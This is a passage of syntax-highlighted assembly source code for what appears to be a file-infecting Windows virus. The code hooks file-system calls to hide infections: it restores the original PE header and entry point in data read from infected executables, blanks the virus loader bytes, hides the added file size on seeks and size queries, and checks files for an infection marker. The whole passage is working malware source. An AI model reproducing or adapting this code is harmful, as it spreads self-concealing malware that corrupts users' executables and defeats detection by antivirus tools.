        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">; above original filesize?</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">ptr_ok</span><span class="sc0">              </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.ir_length</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">xx_ifs_ret</span><span class="sc0">

</span><span class="sc5">ptr_ok</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">edi.ir_length</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">edi.ir_pos</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">size_ok</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">edi.ir_pos</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.ir_length</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc1">;/* Read is now within the original file, so manipulate data returned */</span><span class="sc0">

</span><span class="sc5">size_ok</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">edi.ir_pos</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">edi.ir_data</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">st_data</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">st_pos</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">next_hooker</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc5">edi.ir_error</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; check for errors</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">xx_ifs_ret</span><span class="sc0">

</span><span class="sc1">;********************************************************</span><span class="sc0">
</span><span class="sc1">;*                          *</span><span class="sc0">
</span><span class="sc1">;* Rebuild the original PE header of the infected file  *</span><span class="sc0">
</span><span class="sc1">;* into a designated buffer, for stealth purposes.. *</span><span class="sc0">
</span><span class="sc1">;********************************************************</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">15</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">             </span><span class="sc1">; mark header uninfected</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.IFH_SizeOfOptionalHeader</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; NT header size</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">24</span><span class="sc0">                      </span><span class="sc1">; Image file header</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; ECX points to first Object header in memory</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.IFH_NumberOfSections</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">; EAX = size of PE header including all object headers</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">stealth_table_size</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">40</span><span class="sc0">     </span><span class="sc1">; (plus the required blank entry before stealth table)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PE_SIZE</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc1">;/* get offset in file of virus loader */</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">80</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ecx.PhysicalOffset</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ecx.PhysicalSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LoaderOffs</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">              </span><span class="sc1">; ECX pts to end of CODE section header backup</span><span class="sc0">

    </span><span class="sc1">;/* Restore infected section headers */</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; EDI = PE RVA of last section header</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">EntryPointRVA</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">40</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">

    </span><span class="sc1">;/* Restore the original PE header */</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">ecx.sdEntryPointRVA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.NTOH_EntryPointRVA</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; restore original EntryPoint RVA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">ecx.sdImageSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.NTOH_SizeOfImage</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; restore original imagesize</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">ecx.sdCodeSize</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.NTOH_SizeOfCode</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; restore original codesize</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">ecx.sdCheckSum</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.NTOH_CheckSum</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; restore original checksum</span><span class="sc0">

    </span><span class="sc1">;/* Erase virus stealth table */</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">80</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">stealth_table_size</span><span class="sc0">      </span><span class="sc1">; size of stealth table</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">


</span><span class="sc1">;********************************************************</span><span class="sc0">
</span><span class="sc1">;*                          *</span><span class="sc0">
</span><span class="sc1">;* Stealth on reading from the infected file        *</span><span class="sc0">
</span><span class="sc1">;********************************************************</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">edi.ir_length</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">xx_ifs_ret</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">st_pos</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">st_data</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">HideByte</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">; ESI pts to current byte</span><span class="sc0">

    </span><span class="sc1">;/* Reading inside PE header? */</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PE_RVA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">NextByte</span><span class="sc0">        </span><span class="sc1">; byte is below PE header, so ignore it</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PE_SIZE</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">check_loader</span><span class="sc0">        </span><span class="sc1">; byte is after PE header, check the virus' loader in CODE section</span><span class="sc0">

    </span><span class="sc1">;/* Stealthn one byte PE header */</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PE_RVA</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; EAX = position of byte in PE header</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileBuffer</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">NextByte</span><span class="sc0">

    </span><span class="sc1">;/* Stealth virus loader in CODE section on attempt to read */</span><span class="sc0">

</span><span class="sc5">check_loader</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">LoaderOffs</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">NextByte</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">patchsize</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">NextByte</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

    </span><span class="sc1">;/* Check next byte in reading range */</span><span class="sc0">

</span><span class="sc5">NextByte</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">HideByte</span><span class="sc0">


    </span><span class="sc1">;/* Leave control to next hooker in ifsmgr chain */</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">xx_ifs_ret</span><span class="sc0">
</span><span class="sc5">popad_ifs_hook</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">next_ifs_hook</span><span class="sc0">



</span><span class="sc1">;*********************************************************</span><span class="sc0">
</span><span class="sc1">;*                           *</span><span class="sc0">
</span><span class="sc1">;* SeekFile: Stealthn virus size on seek in file     *</span><span class="sc0">
</span><span class="sc1">;*********************************************************</span><span class="sc0">

</span><span class="sc5">SeekFile</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fsd_seek</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">; store ESI in EBX</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">seek_ioreq</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">; ESI points to ioreq structure, EDI to our buffer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">ioreq</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.ir_flags</span><span class="sc4">],</span><span class="sc5">FILE_END</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.ir_pos</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">             </span><span class="sc1">; seek to end of file</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc5">esi.ir_error</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; check for errors</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">next_ifs_hook</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esi.ir_pos</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">vsize</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">next_ifs_hook</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">vsize</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">file_align</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">next_ifs_hook</span><span class="sc0">

    </span><span class="sc1">;/* File is padded as if it was infected. open it and verify it's an infected PE executable */</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileBuffer</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">checkfile</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">next_ifs_hook</span><span class="sc0">



        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">             </span><span class="sc1">; restore ESI, as we're calling next_hooker</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">next_hooker</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc5">edi.ir_error</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; check for errors</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">xx_ifs_ret</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">edi.ir_pos</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">xx_ifs_ret</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.ir_pos</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">xx_ifs_ret</span><span class="sc0">


    </span><span class="sc1">;/* Subroutine: check if file is an infected MZ PE file */</span><span class="sc0">

</span><span class="sc5">checkfile</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pushad</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">fsd_read</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FSD</span><span class="sc0">             </span><span class="sc1">; Read MZ header</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">not_ok</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">not_ok</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">not_ok</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">PE_RVA</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">400h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FSD</span><span class="sc0">             </span><span class="sc1">; Read PE header</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">not_ok</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc12">'EP'</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">not_ok</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">15</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">not_ok</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">not_ok</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">;*********************************************************</span><span class="sc0">
</span><span class="sc1">;*                           *</span><span class="sc0">
</span><span class="sc1">;* EnumHandle: return original filesize,         *</span><span class="sc0">
</span><span class="sc1">;*********************************************************</span><span class="sc0">

</span><span class="sc5">EnumHandle</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">next_hooker</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">edi.ir_data</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esi.bhfi_nFileSizeLow</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; EAX holds filesize</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">vsize</span><span class="sc0">       </span><span class="sc1">; subtract virus' aligned size</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">file_align</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">xx_ifs_ret</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.bhfi_nFileSizeLow</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">xx_ifs_ret</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dr0</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">exit_ifs_hook</span><span class="sc0">


</span><span class="sc1">;*********************************************************</span><span class="sc0">
</span><span class="sc1">;*                           *</span><span class="sc0">
</span><span class="sc1">;* Store the FSD that is to be called for writing and    *</span><span class="sc0">
</span><span class="sc1">;* filetime (used while infecting).          *</span><span class="sc0">
